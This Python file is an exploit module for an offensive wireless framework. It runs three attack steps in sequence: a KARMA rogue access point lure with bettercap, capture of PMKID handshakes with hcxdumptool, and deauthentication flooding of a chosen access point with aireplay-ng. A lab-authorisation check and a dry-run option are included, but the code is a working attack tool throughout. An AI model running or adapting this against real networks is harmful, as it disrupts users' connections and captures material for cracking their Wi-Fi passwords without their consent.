#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""MoMo-style integrated WPA attack orchestration.

Runs a compact sequence inspired by MoMo research:
KARMA-like lure -> PMKID-first capture -> WPA3/transition pressure.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from pathlib import Path

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    __info__ = {
        "name": "MoMo Integrated Attack",
        "description": (
            "Integrated KARMA + PMKID-first + downgrade orchestration in a single "
            "authorized-lab workflow."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": ("submodules/IoT/wireless-research/MoMo",),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Monitor-mode interface")
    target_bssid = OptMAC("00:00:00:00:00:00", "Target AP BSSID")
    target_channel = OptString("6", "Target channel")
    output_prefix = OptString(".log/momo", "Capture output prefix")
    run_karma = OptBool(True, "Enable KARMA-like lure step (tool-dependent)")
    run_pmkid = OptBool(True, "Enable PMKID-first capture step")
    run_downgrade = OptBool(True, "Enable downgrade pressure step (deauth/beacon)")
    dry_run = OptBool(False, "Print workflow without executing")


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        require_authorised_lab()
        out = Path(str(self.output_prefix))
        out.parent.mkdir(parents=True, exist_ok=True)

        print_status("MoMo integrated sequence starting...")

        if self.run_karma:
            if shutil.which("bettercap"):
                karma_cmd = [
                    "sudo",
                    "bettercap",
                    "-iface",
                    str(self.interface),
                    "-eval",
                    "wifi.recon on; wifi.ap.karma true; wifi.ap.start",
                ]
                print_info("KARMA step: {}".format(" ".join(karma_cmd)))
                if not self.dry_run:
                    subprocess.run(karma_cmd, timeout=20, check=False)
            else:
                print_info("KARMA step skipped (bettercap not found).")

        if self.run_pmkid:
            if shutil.which("hcxdumptool"):
                pmkid_cmd = [
                    "sudo",
                    "hcxdumptool",
                    "-i",
                    str(self.interface),
                    "-o",
                    str(out) + "_pmkid.pcapng",
                    "-c",
                    str(self.target_channel),
                ]
                print_info("PMKID step: {}".format(" ".join(pmkid_cmd)))
                if not self.dry_run:
                    subprocess.run(pmkid_cmd, timeout=30, check=False)
            else:
                print_info("PMKID step skipped (hcxdumptool not found).")

        if self.run_downgrade:
            if shutil.which("aireplay-ng"):
                deauth_cmd = [
                    "sudo",
                    "aireplay-ng",
                    "--deauth",
                    "10",
                    "-a",
                    str(self.target_bssid),
                    str(self.interface),
                ]
                print_info("Downgrade pressure step: {}".format(" ".join(deauth_cmd)))
                if not self.dry_run:
                    subprocess.run(deauth_cmd, check=False)
            else:
                print_info("Downgrade pressure step skipped (aireplay-ng not found).")

        print_success("MoMo integrated workflow finished.")
